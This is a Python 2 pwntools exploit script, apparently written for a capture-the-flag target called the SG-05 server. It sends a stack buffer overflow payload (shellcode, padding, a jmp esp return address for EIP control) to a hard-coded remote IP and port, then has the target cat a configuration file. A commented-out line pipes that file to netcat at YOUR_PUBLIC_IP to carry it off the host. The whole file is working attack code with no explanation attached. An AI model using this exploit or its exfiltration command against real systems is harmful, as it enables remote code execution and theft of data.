from pwn import *
context.os = 'linux'
context.arch = 'i386'
#conn = remote("127.0.0.1", 4242)
conn = remote("54.233.105.81", 4242) # SG-05 server

print conn.recvuntil('users')
conn.send("X")
print conn.recvuntil('!')
print conn.recvuntil('!')
print conn.recvuntil('\x00')

tmpfile = open("shellc1.asm", "r")
tmp = tmpfile.read()
subesp = asm(tmp)

scfile = open("shellc2.asm", "r")
sc = scfile.read()
shellcode = asm(sc)

pwn = shellcode
pwn += 'A'*(0x68-len(shellcode))
pwn += pack(0xe4ffffe4)
pwn += 'BBBB'
pwn += pack(0x0804936b) #eip control here! jmp esp which is pointing to the below instructions
pwn += subesp
#cmd = "/bin/netstat -tan\x00"
cmd = "/bin/cat /gnome/www/files/gnome.conf\x00"
#cmd = '/bin/cat /gnome/www/files/gnome.conf | /bin/nc YOUR_PUBLIC_IP YOUR_PUBLIC_PORT\x00'
pwn += cmd
pwn += 'C'*(0x56-len(subesp)-len(cmd))

print '----'
print 'Sending payload'
#print pwn
print '----'

conn.send(pwn)
pause(9)	# pause to keep the socket alive. program will write reply into the socket
results = conn.recvall()
print results

fh = open('results', 'w') # write response to file, handles file downloads
fh.write(results)
fh.close